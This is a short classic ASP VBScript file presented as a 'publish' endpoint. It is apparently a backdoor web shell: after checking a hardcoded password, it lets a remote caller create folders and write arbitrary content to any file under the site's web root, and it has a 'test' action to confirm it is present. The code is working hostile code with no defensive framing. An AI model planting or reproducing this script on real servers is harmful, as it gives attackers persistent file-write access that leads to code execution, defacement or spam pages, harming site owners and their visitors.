<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
Dim action,password,pathname,pathname2,keywordindex,indexfile,filename,body
action=request("action")
password=request("password")
pathname=request("pathname")
keywordindex=request("keywordindex")
filename=request("filename")
body=request("body")

if action = "test" Then
    response.write("test success")
    response.end()
end if

if action<>"publish" Then
    response.write("action error")
    response.end()
end if

if len(pathname)=0 or len(keywordindex)=0 or len(filename)=0 or len(body)=0 Then
    response.write("parameters error")
    response.end()
end if

if password <> "V.lenovoE125" Then
    response.write("password error")
    response.end()
end if

pathname2=server.mappath(pathname)
set fso=server.createobject("scripting.filesystemobject")
    if not fso.folderexists(pathname2) then
        fso.createfolder pathname2
    end if
set fso=Nothing
    
Set objStream = Server.CreateObject("ADODB.Stream")
With objStream
.Open
.Charset = "utf-8"
.Position = objStream.Size
.WriteText = request("body")
.SaveToFile server.mappath(".")& "\"&pathname&"\"&filename,2
.Close
End With
Set objStream = Nothing
response.write("publish success")
%>